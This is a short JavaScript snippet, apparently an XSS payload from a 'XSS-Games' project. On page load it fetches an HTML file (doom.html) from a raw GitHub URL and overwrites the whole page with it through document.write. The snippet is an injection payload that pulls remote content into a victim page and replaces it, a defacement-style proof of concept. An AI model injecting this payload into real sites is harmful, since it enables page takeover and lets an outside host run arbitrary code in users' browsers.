document.addEventListener("DOMContentLoaded", function(event) {

	var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
     	document.write(this.responseText);
		 	document.close();
    }
  };
  xhttp.open("GET", "https://raw.githubusercontent.com/Jhounx/XSS-Games/main/doom.html", true);
  xhttp.send();


});
